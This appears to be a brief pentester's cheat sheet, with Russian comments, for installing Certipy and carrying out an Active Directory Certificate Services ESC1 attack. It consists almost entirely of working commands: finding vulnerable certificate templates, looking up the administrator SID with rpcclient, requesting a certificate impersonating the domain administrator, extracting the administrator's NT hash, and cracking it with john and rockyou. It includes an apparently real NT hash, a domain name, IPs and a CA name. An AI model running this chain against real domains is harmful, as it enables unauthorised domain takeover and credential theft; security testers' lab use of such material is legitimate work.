From Windows 
install certipy 
git clone https://github.com/ly4k/Certipy?ysclid=mc20q3o3t2807600738
py -3.12 -m venv certipy-venv
certipy-venv\Scripts\Activate.ps1
python -m pip install --proxy=http://username:password@ip:port certipy-ad
ceripy -h (should show version)
Recon
certipy find -u username -p password -dc-ip 10.10.10.10 -vulnerable -stdout
(find Domain Controller -> Nltest /dclist:abc.example)

#ESC1
certipy-ad find -u 'tel_engineer01@telecore.ad' -hashes e2b1996aaff0f57bccb916265a77970e -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout
# нужен SID пользователя к которому будем подключаться
rpcclient --user 'telecore.ad/tel_engineer01' --pw-nt-hash 10.5.2.2 -c "lookupnames administrator"    (или просто в bloodhound посмотреть)
#получаем pfx файл
certipy-ad -debug req -u 'tel_engineer01@telecore.ad' -hashes e2b1996aaff0f57bccb916265a77970e -target 10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Tel_User' -upn 'administrator@telecore.ad' -sid 'S-1-5-21-1588247407-410625039-1511794522-500'
#получаем NT хэш administrator
certipy-ad -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2
# брутим
john ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT

Если нашло уязвимых шаблонов:
certipy find -u 'pentest@domain.com' -p 'password' -dc-ip 'ip od DC' -text -enabled -hide-admins -stdout

